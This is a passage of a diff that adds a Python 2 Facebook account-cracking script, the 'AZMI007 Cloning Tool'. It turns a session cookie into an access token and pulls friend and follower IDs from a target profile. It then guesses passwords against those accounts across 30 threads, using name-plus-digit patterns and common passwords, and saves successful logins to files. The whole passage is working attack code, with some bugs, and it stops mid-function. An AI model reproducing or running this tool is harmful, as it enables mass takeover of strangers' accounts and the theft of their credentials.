+           'content-type': 'text/html; charset=utf-8', 
+           'cookie': cookie}
+        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
+        c2 = re.search('(EAAA\\w+)', c1.text)
+        hasil = c2.group(1)
+        ok = open('access_token.txt', 'w')
+        ok.write(hasil)
+        ok.close()
+        menu()
+    except AttributeError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \x1b[1;92mPress enter to try again ')
+        log_menu()
+    except UnboundLocalError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \x1b[1;92mPress enter to try again ')
+        log_menu()
+    except requests.exceptions.SSLError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \x1b[1;92mPress enter to try again ')
+        log_menu()
+
+
+def menu():
+    os.system('clear')
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        print ''
+        print logo
+        print '\x1b[1;31;1mLogin FB id to continue'
+        time.sleep(1)
+        log_menu()
+
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
+        q = json.loads(r.text)
+        z = q['name']
+    except (KeyError, IOError):
+        print logo
+        print ''
+        print '\t Account Cheekpoint\x1b[0;97m'
+        print ''
+        os.system('rm -rf access_token.txt')
+        time.sleep(1)
+        log_menu()
+    except requests.exceptions.ConnectionError:
+        print logo
+        print ''
+        print '\t Turn on mobile data/wifi\x1b[0;97m'
+        print ''
+        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
+        menu()
+
+    os.system('clear')
+    print logo
+    tok = open('/sdcard/.Azmi.txt', 'r').read()
+    print '  \x1b[1;92mLogged in user: \x1b[1;91m' + z
+    print 47 * '-'
+    print ' \x1b[1;93m Active token: \x1b[1;91m' + tok
+    print ' ------------------------------------------ '
+    print '\x1b[1;92m[1] Crack with Auto password 10'
+    print '\x1b[1;92m[2] Crack with Number password 6'
+    print '\x1b[1;92m[3] Crack with Name + Number password 8'
+    print '\x1b[1;92m[4] Extract File'
+    print '\x1b[1;92m[5] Logout'
+    print '\x1b[1;92m[6] Delete trash files'
+    menu_s()
+
+
+def menu_s():
+    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80==>\xe2\x9e\xa4 ')
+    if ms == '1':
+        auto_crack()
+    elif ms == '2':
+        choice_crack()
+    elif ms == '3':
+        name_crack()
+    elif ms == '4':
+        os.system('python2 ok.py')
+    elif ms == '5':
+        lout()
+    elif ms == '6':
+        rtrash()
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        menu_s()
+
+
+def crack():
+    global toket
+    try:
+        toket = open('login.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t File Not Found \x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
+    print 47 * '-'
+    print '\x1b[1;92m[1] Public id cloning'
+    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[3] File cloning'
+    print '\x1b[1;92m[0] Back'
+    a_s()
+
+
+def auto_crack():
+    global token
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t Login FB id to continue\x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;93m~~~~ Auto pass cracking ~~~~\x1b[1;91m'
+    print 47 * '-'
+    print '\x1b[1;92m[1] Public id cloning'
+    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[3] File cloning'
+    print '\x1b[1;92m[0] Back'
+    a_s()
+
+
+def a_s():
+    id = []
+    cps = []
+    oks = []
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80==>\xe2\x9e\xa4 ')
+    if a_s == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Auto pass public cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\x1b[1;93m~~~~ Auto pass public cracking ~~~~'
+            print ' \x1b[1;92mCloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input(' \x1b[1;92mPress enter to try again ')
+            auto_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+
+    elif a_s == '2':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print 47 * '-'
+        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
+        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
+        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
+        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
+            print ' \x1b[1;92mCloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input('\x1b[1;92mPress enter to try again ')
+            auto_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Auto pass File cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        try:
+            idlist = raw_input('[+] File Name: ')
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found.'
+            raw_input('Press Enter To Back. ')
+            crack()
+
+    elif a_s == '0':
+        menu()
+    else:
+        print ''
+        print '\tChoose valid option' + w
+        a_s()
+    print ' Total ids: ' + str(len(id))
+    time.sleep(0.5)
+    print ' \x1b[1;97mCrack Running\x1b[1;91m '
+    time.sleep(0.5)
+    print 47 * '-'
+    print '\t\x1b[1;92m{AZMI007}  {Cloning Tool}\x1b[1;91m'
+    print 47 * '-'
+
+    def main(arg):
+        user = arg
+        uid, name = user.split('|')
+        try:
+            pass1 = name.lower() + '12345'
+            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1
+                cp = open('AZMI_CP.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid + pass1)
+            else:
+                pass2 = name.lower() + '1234'
+                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                    ok.write(uid + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2
+                    cp = open('AZMI_CP.txt', 'a')
+                    cp.write(uid + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(uid + pass2)
+                else:
+                    pass3 = name.lower() + '786'
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                        ok.write(uid + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(uid + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3
+                        cp = open('AZMI_CP.txt', 'a')
+                        cp.write(uid + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(uid + pass3)
+                    else:
+                        pass4 = name.lower() + '123'
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                            ok.write(uid + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(uid + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4
+                            cp = open('AZMI_CP.txt', 'a')
+                            cp.write(uid + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(uid + pass4)
+                        else:
+                            pass5 = '223344'
+                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
+                            q = json.loads(data)
+                            if 'loc' in q:
+                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                ok.write(uid + ' | ' + pass5 + '\n')
+                                ok.close()
+                                oks.append(uid + pass5)
+                            elif 'www.facebook.com' in q['error']:
+                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass5
+                                cp = open('AZMI_CP.txt', 'a')
+                                cp.write(uid + ' | ' + pass5 + '\n')
+                                cp.close()
+                                cps.apppend(uid + pass5)
+                            else:
+                                pass6 = '334455'
+                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
+                                q = json.loads(data)
+                                if 'loc' in q:
+                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                    ok.write(uid + ' | ' + pass6 + '\n')
+                                    ok.close()
+                                    oks.append(uid + pass6)
+                                elif 'www.facebook.com' in q['error']:
+                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass6
+                                    cp = open('AZMI_CP.txt', 'a')
+                                    cp.write(uid + ' | ' + pass6 + '\n')
+                                    cp.close()
+                                    cps.apppend(uid + pass6)
+                                else:
+                                    pass7 = '445566'
+                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
+                                    q = json.loads(data)
+                                    if 'loc' in q:
+                                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                        ok.write(uid + ' | ' + pass7 + '\n')
+                                        ok.close()
+                                        oks.append(uid + pass7)
+                                    elif 'www.facebook.com' in q['error']:
+                                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass7
+                                        cp = open('AZMI_CP.txt', 'a')
+                                        cp.write(uid + ' | ' + pass7 + '\n')
+                                        cp.close()
+                                        cps.apppend(uid + pass7)
+                                    else:
+                                        pass8 = 'pakistan'
+                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
+                                        q = json.loads(data)
+                                        if 'loc' in q:
+                                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                            ok.write(uid + ' | ' + pass8 + '\n')
+                                            ok.close()
+                                            oks.append(uid + pass8)
+                                        elif 'www.facebook.com' in q['error']:
+                                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass8
+                                            cp = open('AZMI_CP.txt', 'a')
+                                            cp.write(uid + ' | ' + pass8 + '\n')
+                                            cp.close()
+                                            cps.apppend(uid + pass8)
+                                        else:
+                                            pass9 = '1234567'
+                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
+                                            q = json.loads(data)
+                                            if 'loc' in q:
+                                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
+                                                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                                ok.write(uid + ' | ' + pass9 + '\n')
+                                                ok.close()
+                                                oks.append(uid + pass9)
+                                            elif 'www.facebook.com' in q['error']:
+                                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass9
+                                                cp = open('AZMI_CP.txt', 'a')
+                                                cp.write(uid + ' | ' + pass9 + '\n')
+                                                cp.close()
+                                                cps.apppend(uid + pass9)
+                                            else:
+                                                pass10 = '786000'
+                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
+                                                q = json.loads(data)
+                                                if 'loc' in q:
+                                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
+                                                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                                    ok.write(uid + ' | ' + pass10 + '\n')
+                                                    ok.close()
+                                                    oks.append(uid + pass10)
+                                                elif 'www.facebook.com' in q['error']:
+                                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass10
+                                                    cp = open('AZMI_CP.txt', 'a')
+                                                    cp.write(uid + ' | ' + pass10 + '\n')
+                                                    cp.close()
+                                                    cps.apppend(uid + pass10)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 47 * '-'
+    print ' \x1b[1;92mCrack Done'
+    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print 47 * '-'
+    raw_input(' \x1b[1;93mPress enter to back')
+    auto_crack()
+
+
+def crack_b():
+    global toket
+    try:
+        toket = open('login.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t File Not Found \x1b[0;97m'
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
+    print 47 * '-'
+    print '\x1b[1;92m[1] Public id cloning'
+    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[3] File cloning'
+    print '\x1b[1;92m[0] Back'
+    c_s()
+
+
+def choice_crack():
+    global token
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~ Login FB id to continue ~~~'
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
+    print 47 * '-'
+    print '\x1b[1;92m[1] Public id cloning'
+    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[3] File cloning'
+    print '\x1b[1;92m[0] Back'
+    c_s()
+
+
+def c_s():
+    id = []
+    cps = []
+    oks = []
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\X80==>\xe2\x9e\xa4 ')
+    if a_s == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
+        print 47 * '-'
+        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
+        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
+        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
+        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
+            print ' Cloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input(' Press enter to try again ')
+            choice_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+
+    elif a_s == '2':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
+        print 47 * '-'
+        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
+        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
+        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
+        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
+        idt = raw_input(' \x1b[1;93mEnter id: ')
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~'
+            print ' Cloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input('Press enter to try again ')
+            auto_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m ~~~~ Number pass File cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
+        print 47 * '-'
+        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
+        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
+        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
+        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
+        try:
+            idlist = raw_input('[+] File Name: ')
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found.'
+            raw_input('Press Enter To Back. ')
+            crack_b()
+
+    elif a_s == '0':
+        menu()
+    else:
+        print ''
+        print '\t Choose valid option' + w
+        c_s()
+    print ' Total ids: ' + str(len(id))
+    time.sleep(0.5)
+    print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
+    time.sleep(0.5)
+    print 47 * '-'
+    print '\t\x1b[1;94m{AZMI007}  {Cloning Tool\x1b[1;91m'
+    print 47 * '-'
+
+    def main(arg):
+        user = arg
+        uid, name = user.split('|')
+        try:
+            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1
+                cp = open('AZMI_CP.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid + pass1)
+            else:
+                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                    ok.write(uid + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2
+                    cp = open('AZMI_CP.txt', 'a')
+                    cp.write(uid + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(uid + pass2)
+                else:
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                        ok.write(uid + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(uid + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3
+                        cp = open('AZMI_CP.txt', 'a')
+                        cp.write(uid + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(uid + pass3)
+                    else:
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                            ok.write(uid + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(uid + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4
+                            cp = open('AZMI_CP.txt', 'a')
+                            cp.write(uid + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(uid + pass4)
+                        else:
+                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
+                            q = json.loads(data)
+                            if 'loc' in q:
+                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                ok.write(uid + ' | ' + pass5 + '\n')
+                                ok.close()
+                                oks.append(uid + pass5)
+                            elif 'www.facebook.com' in q['error']:
+                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass5
+                                cp = open('AZMI_CP.txt', 'a')
+                                cp.write(uid + ' | ' + pass5 + '\n')
+                                cp.close()
+                                cps.apppend(uid + pass5)
+                            else:
+                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
+                                q = json.loads(data)
+                                if 'loc' in q:
+                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                    ok.write(uid + ' | ' + pass6 + '\n')
+                                    ok.close()
+                                    oks.append(uid + pass6)
+                                elif 'www.facebook.com' in q['error']:
+                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass6
+                                    cp = open('AZMI_CP.txt', 'a')
+                                    cp.write(uid + ' | ' + pass6 + '\n')
+                                    cp.close()
+                                    cps.apppend(uid + pass6)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 47 * '-'
+    print ' \x1b[1;92mCrack Done'
+    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print 47 * '-'
+    raw_input('\x1b[1;93m Press enter to back')
+    choice_crack()
+
+
+def crack_b():
+    global toket
+    try:
+        toket = open('login.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t File Not Found \x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
+    print 47 * '-'
+    print '\x1b[1;92m[1] Public id cloning'
+    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[3] File cloning'
+    print '\x1b[1;92m[0] Back'
+    a_s()
+
+
+def name_crack():
+    global token
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\t Login FB id to continue\x1b[0;97m'
+        print ''
+        time.sleep(1)
+        log_menu()
+
+    os.system('clear')
+    print logo
+    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
+    print 47 * '-'
+    print '\x1b[1;92m[1] Public id cloning'
+    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[3] File cloning'
+    print '\x1b[1;92m[0] Back'
+    n_s()
+
+
+def n_s():
+    id = []
+    cps = []
+    oks = []
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Azmi\xe2\x9e\xa4 ')
+    if a_s == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print 47 * '-'
+        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
+        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
+        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
+        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
+        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
+        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
+            print ' \x1b[1;92mCloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input(' \x1b[1;92mPress enter to try again ')
+            name_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+
+    elif a_s == '2':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print 47 * '-'
+        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
+        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
+        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
+        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
+            q = json.loads(r.text)
+            z = q['name']
+            os.system('clear')
+            print logo
+            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
+            print ' \x1b[1;92mCloning from: ' + z
+        except (KeyError, IOError):
+            print '\t Invalid user \x1b[0;97m'
+            raw_input('\x1b[1;92mPress enter to try again ')
+            auto_crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+
+    elif a_s == '3':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
+        print 47 * '-'
+        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
+        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
+        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
+        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
+        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
+        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
+        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
+        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
+        try:
+            idlist = raw_input('[+] File Name: ')
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found.'
+            raw_input('Press Enter To Back. ')
+            crack()
+
+    elif a_s == '0':
+        menu()
+    else:
+        print ''
+        print '\tChoose valid option' + w
+        a_s()
+    print ' Total ids: ' + str(len(id))
+    time.sleep(0.5)
+    print ' \x1b[1;97mCrack Running\x1b[1;91m '
